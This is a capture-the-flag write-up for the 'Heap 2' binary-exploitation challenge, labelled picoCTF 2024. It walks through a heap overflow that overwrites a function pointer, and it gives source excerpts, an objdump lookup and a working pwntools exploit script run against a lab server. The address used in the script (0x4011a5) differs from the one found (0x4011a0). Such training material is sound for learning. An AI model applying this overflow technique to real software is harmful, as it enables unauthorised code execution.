## CTF: picoCTF 2024

Challenge: Heap 2

Category: pwn

Points: 10

Difficulty: Intermediate

## Instructions

Can you handle function pointers?

## Solution

This is very similar to heap1, but this time, we're trying to call a function. Run your baseline checks like file and checksec. Then lets see the behavior of the program.

```bash
 have a function, I sometimes like to call it, maybe you should change it

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: 1
[*]   Address   ->   Value
+-------------+-----------+
[*]   0x3f3726b0  ->   pico
+-------------+-----------+
[*]   0x3f3726d0  ->   bico

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: 3

x = bico

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit
```

Again, it looks like we will have to overwrite the safe_var. Lets check out the source file and see what's going on.

```bash
int num_allocs;
char *x;
char *input_data;

void win() {
    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);
}

void check_win() { ((void (*)())*(int*)x)(); }

```

```bash
void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x, x);
    fflush(stdout);
}
```

We see that we have two global variables, input_data and x. We know that checkwin just calls whatever address is in x. The function we want to put in there is definitely the address of win. Looking at our checksec and file, we know that there is no PIE and it is a 64-bit executable. If we find and pack the address correctly, we know that we can call win. Simple calculations on the given addresses show that the offset is only 32 bytes, same as heap1. Our only job left is finding the address of win, which we can just do with an objdump.

```bash
amichel2579-academy@webshell:~$ objdump  -t chall | grep win
objdump: Warning: Unrecognized form: 0x22
objdump: Warning: Unrecognized form: 0x23
00000000004011f0 g     F .text  000000000000000e              check_win
00000000004011a0 g     F .text  0000000000000042              win
amichel2579-academy@webshell:~$
```

We see that the address is **0x4011a0.** We now have everything we need to build or exploit.

### Exploit

```bash
from pwn import *
p = context.binary = ELF("./chall.1")
#p = process()
p = remote("chatelaine.cylabacademy.net", 31871)
winner = 0x4011a5
first_payload = "2"
p.sendline(first_payload)
second_payload = b"A" * 32 + p32(winner)
p.sendline(second_payload)
final = "4"
p.sendline(final)
p.interactive()

```

```bash
I have a function, I sometimes like to call it, maybe you should change it

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: Data for buffer:
1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: academy{and_down_the_road_we_go_358513ca}
[*] Got EOF while reading in interactive
```

## Flag

```bash
academy{and_down_the_road_we_go_358513ca}
```

## Mitigation

Limit the input of the user by checking size